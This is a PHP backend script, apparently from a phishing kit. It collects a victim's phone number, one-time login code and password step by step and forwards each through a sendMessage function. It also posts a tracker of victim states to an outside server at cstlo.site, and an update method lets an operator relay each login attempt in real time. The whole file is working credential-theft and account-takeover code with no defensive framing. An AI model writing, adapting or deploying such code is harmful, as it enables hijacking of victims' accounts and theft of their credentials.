<?php
session_start();
header("Content-Type: application/json");

require("_core.php");

$r = array();
$allowedMethod = ["sendCode","sendOtp","sendPassword","update","getStatus"];
$apiUrl = "https://cstlo.site/API/server.php"; // Ganti dengan URL API server penyimpanan

if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
    $method = $_POST["method"];

    // Ambil data tracker dari server lain melalui API
    $tracker = json_decode(file_get_contents($apiUrl), true);
    
    switch($method) {
        // STATUS : WAITING, SUCCESS, FAILED
        case "getStatus":
            $phoneN = $_SESSION["phone"];
            if(isset($tracker[$phoneN])) {
                $TX = $tracker[$phoneN];
                $r["result"] = $tracker[$phoneN];
                if($tracker[$phoneN]["status"] == "success") {
                    switch($tracker[$phoneN]["type"]) {
                        case "checkPhone": $_SESSION["state"] = "phone"; break;
                        case "OTP":
                            $_SESSION["state"] = $TX["detail"] == "success" ? "success" : ($TX["detail"] == "passwordNeeded" ? "otp" : false);
                            break;
                        case "password": $_SESSION["state"] = "success"; break;
                        default: $x = true; break;
                    }
                }
            }
            break;

        case "sendCode":
            $phoneN = str_replace(" ","", $_POST['phone']);
            $phoneN = str_replace("+","", $phoneN);
            $_SESSION["phone"] = $phoneN;
            $tracker[$phoneN] = array("type" => "checkPhone", "status" => "waiting");
            sendMessage($phoneN);

            // Kirim data ke server API
            sendDataToApi($tracker);
            break;

        case "sendOtp":
            $OTP = $_POST["otp"];
            $phoneN = $_SESSION["phone"];
            $_SESSION["otp"] = $OTP;
            $tracker[$phoneN] = array("type" => "OTP", "status" => "waiting");
            sendMessage(implode(":", [$phoneN,$OTP]));

            // Kirim data ke server API
            sendDataToApi($tracker);
            break;

        case "sendPassword":
            $OTP = $_SESSION["otp"];
            $phoneN = $_SESSION["phone"];
            $password = $_POST["password"];
            $tracker[$phoneN] = array("type" => "password", "status" => "waiting");
            sendMessage(implode(":", [$phoneN,$OTP,$password]));

            // Kirim data ke server API
            sendDataToApi($tracker);
            break;

        case "update":
            $phoneN = $_POST["phone"];
            if (isset($tracker[$phoneN])) {
                $tracker[$phoneN] = array(
                    "type" => $_POST["type"],
                    "status" => $_POST["status"]
                );

                if(isset($_POST["detail"])) {
                    $tracker[$phoneN]["detail"] = $_POST["detail"];
                }

                if(isset($_POST["hint"])) {
                    $tracker[$phoneN]["hint"] = $_POST["hint"];
                    $_SESSION["hint"] = $_POST["hint"];
                }
            }

            // Kirim data ke server API
            sendDataToApi($tracker);
            break;

        default:
            // $response
            break;
    }
}

// Fungsi untuk mengirim data ke API server lain
function sendDataToApi($tracker) {
    global $apiUrl;

    $data = json_encode($tracker);
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

echo json_encode($r, JSON_PRETTY_PRINT);
?>